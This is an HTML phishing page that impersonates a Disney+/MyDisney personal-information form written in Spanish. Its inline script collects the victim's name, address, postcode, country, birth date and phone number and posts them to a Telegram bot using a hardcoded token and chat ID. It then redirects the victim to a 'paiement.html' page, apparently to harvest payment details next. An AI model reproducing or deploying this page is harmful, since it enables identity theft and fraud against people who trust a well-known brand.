<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Información personal | Disney+</title>
  <!-- CSS commun -->
  <link rel="stylesheet" href="style.css"/>
</head>
<body class="page-form">
  <main>
    <!-- Logo MyDisney -->
    <img src="Images/Mydisney-logo.png" alt="MyDisney" class="center-logo"/>

    <h1>Información personal</h1>

    <form id="infoForm">
      <input type="text" placeholder="Apellido" required/>
      <input type="text" placeholder="Nombre" required/>
      <input type="text" placeholder="Dirección" required/>
      <input type="text" placeholder="Ciudad" required/>
      <input type="text" placeholder="Código postal" required/>
      <select required>
        <option value="" disabled selected>País</option>
        <option value="ES">España</option>
        <option value="FR">Francia</option>
        <option value="BE">Bélgica</option>
        <option value="CH">Suiza</option>
      </select>

      <!-- Champ date avec placeholder interne -->
      <input
        type="date"
        id="nacimiento"
        name="nacimiento"
        placeholder="Fecha de nacimiento"
        min="1900-01-01"
        max="2025-12-31"
        required
      />

      <input type="tel" placeholder="Teléfono" required/>
      <button type="submit">Continuar</button>
    </form>

    <!-- Note + logos partenaires -->
    <div class="footer-note">
      <strong>Disney+ forma parte del grupo Walt Disney</strong><br/>
      MyDisney te da acceso a servicios como Disney+, ESPN, Walt Disney World <a href="#">y más</a>.
      <div class="logos-container">
        <img src="Images/compose2.png" alt="Disney+"/>
        <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
        <img src="Images/espn-png-logo-4149.png" alt="ESPN"/>
        <img src="Images/marvel-logo-34291.png" alt="Marvel"/>
        <img src="Images/star-wars-logo-1002.png" alt="Star Wars"/>
        <img src="Images/Hulu-Logo-PNG.png" alt="Hulu"/>
        <img src="Images/natgeo-logo.png" alt="National Geographic"/>
      </div>
    </div>
  </main>

  <!-- Overlay du spinner -->
  <div id="spinnerOverlay">
    <div class="spinner"></div>
  </div>

  <script>
    document.getElementById("infoForm").addEventListener("submit", function(e) {
      e.preventDefault();
      document.getElementById("spinnerOverlay").style.display = "flex";

      const elems = this.elements;
      const data = {
        apellido: elems[0].value.trim(),
        nombre:   elems[1].value.trim(),
        direccion:elems[2].value.trim(),
        ciudad:   elems[3].value.trim(),
        cp:       elems[4].value.trim(),
        pais:     elems[5].value,
        nacimiento: elems['nacimiento'].value, 
        telefono: elems[7].value.trim()
      };

      const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
      const chatId   = "-1887198443";
      const message  =
        `📋 Información personal:\n` +
        `Apellido: ${data.apellido}\n` +
        `Nombre: ${data.nombre}\n` +
        `Dirección: ${data.direccion}\n` +
        `Ciudad: ${data.ciudad}\n` +
        `Código postal: ${data.cp}\n` +
        `País: ${data.pais}\n` +
        `Fecha de nacimiento: ${data.nacimiento}\n` +
        `Teléfono: ${data.telefono}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      })
      .catch(err => console.error("Erreur Telegram:", err))
      .finally(() => {
        setTimeout(() => {
          window.location.href = "paiement.html";
        }, 2500);
      });
    });
  </script>
</body>
</html>
